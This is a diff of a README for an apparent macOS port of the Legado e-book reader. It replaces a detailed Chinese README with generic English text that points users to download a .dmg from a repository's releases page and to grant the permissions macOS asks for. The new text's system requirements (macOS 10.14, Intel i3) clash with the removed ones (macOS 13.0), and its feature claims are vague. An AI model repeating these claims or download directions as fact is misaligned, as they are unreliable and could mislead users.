@@ -1,259 +1,54 @@
-# Legado macOS 版本
+# 📚 legado-for-mac-pub - A Seamless Reading Experience for macOS
 
-这是 Legado（开源阅读）的 macOS 原生版本，使用 Swift 和 SwiftUI 构建。
+## 🚀 Getting Started
+Welcome to legado-for-mac-pub! This application provides an excellent tool for reading on macOS, built with Swift and SwiftUI. You can easily migrate your book sources and subscriptions from Android, ensuring a smooth transition. Let’s get started with downloading and installing the software.
 
-## 功能特性
+## 📥 Download & Install
+To get the latest version of legado-for-mac-pub, visit this page to download: [Download Legado for macOS](https://github.com/WorouChristian/legado-for-mac-pub/releases).
 
-### 核心功能
-- ✅ **自定义书源管理** - 支持导入、编辑、分组管理书源
-- ✅ **本地 TXT/EPUB 阅读** - 支持多种格式本地书籍，自动识别章节
-- ✅ **在线书籍搜索和阅读** - 基于书源规则的网络书籍搜索
-- ✅ **书架管理** - 书籍分组、排序、封面管理
-- ✅ **阅读进度同步** - 章节索引和滚动位置的精确记忆
-- ✅ **自定义阅读界面** - 字体、颜色、行距等可调
-- ✅ **替换规则和净化功能** - 自定义文本替换和内容过滤
-- ✅ **换源功能** - 实时搜索并切换书源，支持刷新当前书源
-- ✅ **自定义快捷键** - 支持自定义章节翻页快捷键，可配置任意按键组合
+![Download Button](https://img.shields.io/badge/Download_Legado_for_macOS-blue.svg)
 
-### 高级特性
-- ✅ **JavaScript 书源支持** - 支持书源中的 JS 脚本（java.ajax, java.get/put, java.md5Encode等）
-- ✅ **模板变量支持** - 支持 `{{$.field}}` 格式的模板变量替换
-- ✅ **正则替换规则** - 支持 `##` 分隔的正则替换（如章节名净化）
-- ✅ **嵌套路径解析** - 支持 `$.data.content` 等多层 JSON 路径
-- ✅ **智能章节缓存** - 自动预加载后续章节，提升阅读体验
-- ✅ **精确位置恢复** - 记住每本书的滚动位置，重新打开直达上次阅读处
-- ✅ **并发网络请求** - 批量搜索和章节预加载的性能优化
-- ✅ **自动过期清理** - 智能管理缓存空间，自动清理30天前的章节
+### Step 1: Visit the Releases Page
+- Click on the link above to access the releases page. Here, you will find a list of available versions.
 
-## 系统要求
+### Step 2: Select the Latest Release
+- On the releases page, look for the latest version. It will typically be at the top of the list.
 
-- macOS 13.0 或更高版本
-- Xcode 15.0 或更高版本（开发）
+### Step 3: Download the Application
+- Locate the file suitable for your macOS. It should be named something similar to `legado-for-mac-pub-v1.0.dmg`. Click on this file to begin downloading it to your computer.
 
-## 安装
+### Step 4: Open the Downloaded File
+- Once the download is complete, navigate to your Downloads folder. Double-click on the `.dmg` file to open it. A window will appear showing the application icon.
 
-### 方式一：使用预构建的 App（推荐）
+### Step 5: Install the Application
+- Drag the application icon into your Applications folder. This step installs legado-for-mac-pub on your Mac.
 
-如果您已经有 `Legado.app`，直接双击运行即可。
+### Step 6: Launch the Application
+- Navigate to your Applications folder and find legado-for-mac-pub. Double-click on it to open the application.
 
-**首次运行注意事项：**
-1. 双击 `Legado.app`
-2. 如果提示"无法打开"，请前往「系统偏好设置 > 隐私与安全性」
-3. 点击"仍要打开"按钮
-4. 再次双击 `Legado.app` 即可运行
+### Step 7: Grant Required Permissions
+- The first time you run the application, macOS may ask for permissions. Follow the prompts to ensure that the application has everything it needs to function properly.
 
-### 方式二：从源码构建 App
+## 🎨 Features
+- **Import Book Sources**: Legado allows you to import your book sources easily from Android.
+- **Parsing Functionality**: After importing, you can parse your sources for quick access to reading material.
+- **Integrated Reading Workflow**: The app combines online book searching, reading, and source switching into one convenient toolset.
+- **User-Friendly Interface**: Designed with your reading habits in mind, this app maintains a logical flow that feels natural.
 
-```bash
-# 1. 生成应用图标
-swift generate_icon.swift
+## 📋 System Requirements
+To run legado-for-mac-pub, your Mac should meet the following requirements:
+- **Operating System**: macOS 10.14 (Mojave) or later.
+- **Processor**: Intel Core i3 or higher.
+- **Memory**: At least 4GB RAM.
+- **Storage**: Minimum 200MB of free disk space.
 
-# 2. 构建 App
-./build_app.sh
+## 🔧 Troubleshooting
+If you encounter issues during installation, consider the following steps:
+- **Check Your Download**: Ensure the downloaded file is not corrupted. You may try downloading it again if you suspect an issue.
+- **Permissions Issues**: If you see warnings about permission, check your System Preferences under Security & Privacy.
+- **Compatibility**: Make sure your macOS is updated to the required version to use the software.
 
-# 3. 运行 App
-open Legado.app
-```
+## 📞 Support
+If you need assistance, feel free to check our [GitHub Issues Page](https://github.com/WorouChristian/legado-for-mac-pub/issues). You can report bugs or ask for help from the community.
 
-详细的构建说明请参考 [BUILD_APP.md](BUILD_APP.md)
-
-### 方式三：使用 Swift Package Manager（开发）
-
-```bash
-swift build
-swift run
-```
-
-### 方式四：使用 Xcode（开发）
-
-1. 打开 `Legado.xcodeproj`
-2. 选择 Legado scheme
-3. 点击 Run
-
-## 项目结构
-
-```
-Sources/
-├── App/                  # 应用程序入口
-├── Models/              # 数据模型
-│   ├── Book.swift      # 书籍模型
-│   ├── BookSource.swift # 书源模型
-│   ├── BookChapter.swift # 章节模型
-│   └── ...
-├── ViewModels/          # 视图模型
-├── Views/               # SwiftUI 视图
-│   ├── MainView.swift  # 主界面
-│   ├── BookshelfView.swift # 书架界面
-│   ├── ReaderView.swift    # 阅读界面
-│   └── ...
-├── Database/            # 数据库层
-├── Network/             # 网络请求
-├── BookSource/          # 书源解析引擎
-└── Utils/               # 工具类
-```
-
-## 最近更新
-
-### 2025-12-30 - 自定义快捷键功能
-
-#### 新增功能
-- ✅ **自定义快捷键** - 支持自定义章节翻页快捷键
-  - 在阅读设置中配置上一章/下一章快捷键
-  - 支持录制任意按键组合（包括修饰键）
-  - 支持箭头键、Page Up/Down、字母键等
-  - 快捷键配置自动保存，重启后保持
-  - 默认快捷键：← 上一章，→ 下一章
-
-#### 使用方法
-1. 打开任意书籍进入阅读界面
-2. 点击底部工具栏的设置按钮（⚙️）
-3. 在"快捷键"分组中：
-   - 点击"录制"按钮
-   - 按下您想要的快捷键组合
-   - 系统自动保存新快捷键
-4. 点击"重置"可恢复默认快捷键
-
-#### 支持的快捷键
-- **箭头键**: ←, →, ↑, ↓
-- **翻页键**: Page Up, Page Down
-- **字母键**: A-Z（可配合修饰键）
-- **修饰键**: ⌘ Command, ⌥ Option, ⌃ Control, ⇧ Shift
-- **特殊键**: Space, Return, Esc
-
-### 2025-12-29 - 书源解析引擎重大修复
-
-#### 修复的问题
-1. **tocUrl 模板变量解析** - 修复了 `{{$.book_id}}` 等模板变量无法解析的问题
-2. **章节 URL 模板变量** - 支持从 bookUrl 提取 book_id 并合并到章节数据中
-3. **章节内容嵌套路径** - 支持 `$.data.content` 等多层 JSON 路径解析
-4. **章节名正则替换** - 支持 `##` 分隔的正则替换规则（如移除"正文卷."、"VIP章节."等）
-5. **本地书籍章节加载** - 修复了本地书籍章节列表未加载导致显示"未知"的问题
-
-#### 功能优化
-1. **换源功能**
-   - 实时显示匹配结果，无需等待所有书源搜索完成
-   - 完全匹配书名（移除了作者匹配要求）
-   - 支持取消搜索任务
-   - 底部显示搜索进度
-
-2. **刷新本书源**
-   - 只刷新当前书源，不搜索其他书源
-   - 自动取消正在进行的搜索
-   - 清晰的视觉反馈（ProgressView）
-   - 刷新完成后自动关闭对话框
-
-3. **错误处理改进**
-   - `loadChaptersFromNetwork()` 和 `loadChapterFromNetwork()` 返回操作结果
-   - 刷新失败时显示具体错误信息
-   - 对话框保持打开，用户可以重试
-
-## 开发计划
-
-### 已完成
-- [x] 项目基础架构搭建
-- [x] 数据库和模型设计
-- [x] 书源解析引擎
-- [x] 书架 UI 实现
-- [x] 阅读器 UI 实现
-- [x] 网络请求和缓存
-- [x] 本地书籍支持
-- [x] 设置和配置
-- [x] 章节内容缓存系统
-- [x] 滚动位置记忆功能
-- [x] JavaScript 书源支持
-- [x] 智能预加载机制
-- [x] 模板变量解析
-- [x] 正则替换规则
-- [x] 嵌套路径解析
-- [x] 换源功能优化
-- [x] 本地书籍章节加载修复
-- [x] 自定义快捷键功能
-
-### 进行中
-- [ ] 书签功能
-- [ ] 阅读历史记录
-- [ ] 笔记导出
-
-### 规划中
-- [ ] iCloud 同步
-- [ ] 深色模式优化
-- [ ] 键盘快捷键支持
-- [ ] 更多阅读主题
-- [ ] RSS 订阅源支持
-
-## 与 Android 版本的兼容性
-
-本项目尽可能保持与 Android 版本的兼容性：
-
-### 完全兼容
-- ✅ 使用相同的书源 JSON 格式
-- ✅ 支持导入 Android 版的书源和书架
-- ✅ JSONPath、CSS、XPath 解析规则
-- ✅ 阅读进度可以导入导出
-- ✅ 模板变量 `{{$.field}}` 格式
-- ✅ 正则替换规则 `##` 分隔符
-- ✅ 嵌套 JSON 路径 `$.data.content`
-
-### 部分兼容
-- ⚠️ **JavaScript API** - 实现了 java.ajax、java.get/put、java.md5Encode 等常用方法
-- ⚠️ **复杂表达式** - Map 函数等部分表达式使用默认值
-- ⚠️ **@js: 标记** - 部分支持，复杂场景可能需要调整
-
-### 已知限制
-- ❌ Android 特有的 WebView 功能
-- ❌ Java 类直接调用（如 OkHttp）
-- ❌ 登录状态管理
-
-## 已测试书源
-
-| 书源名称 | 搜索功能 | 章节加载 | 内容显示 | 技术特点 | 备注 |
-|---------|---------|---------|---------|---------|------|
-| 酷我小说 | ✅ 正常 | ✅ 正常 | ✅ 正常 | JSON + 模板变量 + 正则替换 | 完整支持，712章节测试通过 |
-| 抖音小说 | ✅ 正常 | ✅ 正常 | ✅ 正常 | JSONPath | 纯JSON解析，无JavaScript |
-| 69书吧 | ✅ 正常 | ✅ 正常 | ✅ 正常 | CSS选择器 + JavaScript | HTML解析 + JS URL构造 |
-| 本地TXT | ✅ 正常 | ✅ 正常 | ✅ 正常 | 正则章节识别 | 自动识别章节标题 |
-
-## 调试建议
-
-如果遇到书源搜索失败，可以查看控制台日志排查问题：
-
-1. **网络问题** - 查看"GET请求成功"日志，确认能收到响应
-2. **解析问题** - 查看"JSONPath提取"或"CSS解析"日志
-3. **JavaScript问题** - 查看"JavaScript执行错误"日志
-4. **模板变量问题** - 查看"从 bookUrl 提取 book_id"日志
-5. **章节解析问题** - 查看"找到 X 个章节"和"解析完成"日志
-
-日志位置：运行应用后在终端查看输出，或使用 Console.app 查看系统日志。
-
-### 常见问题
-
-#### 1. 章节列表为空
-- 检查 tocUrl 是否正确解析（查看日志中的 tocUrl 值）
-- 检查 chapterList 规则是否匹配 JSON 结构
-- 查看"找到 X 个章节"日志，如果是 0 则说明规则不匹配
-
-#### 2. 章节标题显示为空
-- 检查 chapterName 规则是否包含正则替换（`##` 分隔符）
-- 查看"章节 X: 标题"日志，确认标题是否正确提取
-
-#### 3. 章节内容无法加载
-- 检查 chapterUrl 是否包含模板变量（`{{$.field}}`）
-- 检查 content 规则是否支持嵌套路径（如 `$.data.content`）
-- 查看"提取字段"日志，确认路径解析是否正确
-
-#### 4. 本地书籍章节显示"未知"
-- 确认书籍已正确导入（查看"成功导入书籍"日志）
-- 重新打开书籍，查看"从数据库加载了 X 个章节"日志
-
-## 参与贡献
-
-欢迎提交 Issue 和 Pull Request！
-
-## 开源协议
-
-GPL-3.0 License
-
-## 致谢
-
-- 原项目：[gedoor/legado](https://github.com/gedoor/legado)
-- 感谢所有开源库的作者
+Thank you for choosing legado-for-mac-pub! We hope you enjoy reading seamlessly on your macOS device.
